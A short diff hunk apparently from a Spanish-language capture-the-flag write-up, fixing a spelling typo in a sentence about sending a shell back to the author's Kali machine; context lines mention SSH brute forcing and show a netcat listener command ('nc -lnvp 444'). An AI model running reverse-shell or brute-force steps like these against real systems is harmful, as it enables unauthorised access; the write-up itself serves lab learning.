@@ -108,7 +108,7 @@ Con ellos podemos probar fuerza bruta quizás sobre ssh. Podemos ver que proceso
 
 Podemos ver como rick tiene sesiones SSH activas.
 
-Antes de seguir, vamos a enviarnos la shell a nuestro Kali para pdoer trabajar mejor con ella y no desde le navegador:
+Antes de seguir, vamos a enviarnos la shell a nuestro Kali para poder trabajar mejor con ella y no desde le navegador:
 ```bash
 # En Kali
 nc -lnvp 444
